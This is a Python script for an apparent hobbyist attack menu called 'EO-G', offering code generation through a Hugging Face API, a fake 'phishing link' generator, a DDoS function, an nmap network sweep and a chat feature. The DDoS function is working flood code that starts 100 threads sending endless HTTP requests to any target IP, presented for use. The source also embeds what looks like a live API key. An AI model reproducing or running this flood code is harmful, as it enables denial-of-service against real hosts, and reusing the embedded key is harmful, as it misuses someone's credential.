import os
import threading
import requests
import random
import string
from colorama import Fore, Style

class EO_G:
    def __init__(self):
        # Replace with your Hugging Face API key
        self.api_key = "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"
        self.api_url = "https://api-inference.huggingface.co/models/gpt-3"  # Use GPT-3 instead of GPT-2
        self.headers = {"Authorization": f"Bearer {self.api_key}"}
        self.modes = {
            1: "Generate Code",
            2: "Phishing Link",
            3: "DDOS Attack",
            4: "Device Attack",
            5: "AI Chat Assistant",
            6: "Exit"
        }
        self.code_resources = [
            "https://stackoverflow.com/",
            "https://www.w3schools.com/",
            "https://www.geeksforgeeks.org/",
            "https://www.learnpython.org/"
        ]

    def display_banner(self):
        """Displays a banner."""
        banner = f"""
{Fore.MAGENTA}
 ███████╗ ██████╗       ██████╗  ██████╗ 
 ██╔════╝██╔═══██╗     ██╔═══██╗██╔═══██╗
 █████╗  ██║   ██║     ██║   ██║██║   ██║
 ██╔══╝  ██║   ██║     ██║   ██║██║   ██║
 ██║     ╚██████╔╝     ╚██████╔╝╚██████╔╝
 ╚═╝      ╚═════╝       ╚═════╝  ╚═════╝
      Advanced Real-World Framework
{Style.RESET_ALL}
        """
        print(banner)

    def generate_response(self, prompt, context="general"):
        """Generates a response using GPT API."""
        refined_prompt = f"Context: {context}\nPrompt: {prompt}"
        payload = {
            "inputs": refined_prompt,
            "parameters": {
                "max_length": 300,
                "temperature": 0.7
            }
        }
        try:
            response = requests.post(self.api_url, headers=self.headers, json=payload)
            response.raise_for_status()
            return response.json()[0]['generated_text']
        except requests.exceptions.RequestException as e:
            return f"API Request Error: {e}"
        except KeyError:
            return "No response generated."

    def generate_code(self, description):
        """Generates code using the GPT API."""
        print(f"[EO-G] Generating code for: {description}")
        resources_prompt = f"Here are some useful resources for learning to write code:\n"
        resources_prompt += "\n".join(self.code_resources)
        return self.generate_response(description + "\n" + resources_prompt, context="code generation")

    def phishing_link(self):
        """Generates a random phishing link."""
        domain = ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + ".com"
        phishing_url = f"http://{domain}/login"
        with open("phishing_links.log", "a") as log_file:
            log_file.write(phishing_url + "\n")
        print(f"[EO-G] Phishing link generated: {phishing_url}")
        return phishing_url

    def ddos_attack(self, target_ip):
        """Performs a DDOS attack."""
        print(f"[EO-G] Initiating DDOS attack on {target_ip}")

        def ddos_thread():
            while True:
                try:
                    requests.get(f"http://{target_ip}")
                except Exception as e:
                    print(f"Error in DDOS thread: {e}")

        threads = []
        for _ in range(100):  # Adjust thread count as needed
            thread = threading.Thread(target=ddos_thread)
            threads.append(thread)
            thread.start()
        return f"[EO-G] DDOS attack launched on {target_ip}."

    def device_attack(self, ip):
        """Performs a network scan using Nmap."""
        print(f"[EO-G] Scanning devices on the network near {ip}")
        try:
            devices = os.popen(f"nmap -sP {ip}/24").read()
            print(devices)
            return devices
        except Exception as e:
            return f"Error during network scan: {e}"

    def ai_chat_assistant(self, query):
        """Handles queries using the GPT API."""
        print(f"[EO-G] Processing query: {query}")
        return self.generate_response(query, context="chat assistant")

    def execute(self):
        """Main execution loop."""
        self.display_banner()
        print("[EO-G] Welcome to EO-G: The Advanced Real-World Framework")

        while True:
            print("\n[EO-G] Select an option:")
            for num, mode in self.modes.items():
                print(f" {num}: {mode}")
            try:
                choice = int(input("[EO-G] Enter the number of your choice: "))
                if choice == 1:
                    description = input("[EO-G] Describe the code to generate: ")
                    print(self.generate_code(description))
                elif choice == 2:
                    print(f"[EO-G] Phishing link: {self.phishing_link()}")
                elif choice == 3:
                    target_ip = input("[EO-G] Enter target IP for DDOS attack: ")
                    print(self.ddos_attack(target_ip))
                elif choice == 4:
                    ip_range = input("[EO-G] Enter IP range (e.g., 192.168.1.0): ")
                    print(self.device_attack(ip_range))
                elif choice == 5:
                    query = input("[EO-G] Enter your query: ")
                    print(self.ai_chat_assistant(query))
                elif choice == 6:
                    print("[EO-G] Exiting... Goodbye!")
                    break
                else:
                    print("[EO-G] Invalid choice. Please try again.")
            except ValueError:
                print("[EO-G] Please enter a valid number.")

if __name__ == "__main__":
    eog = EO_G()
    eog.execute()
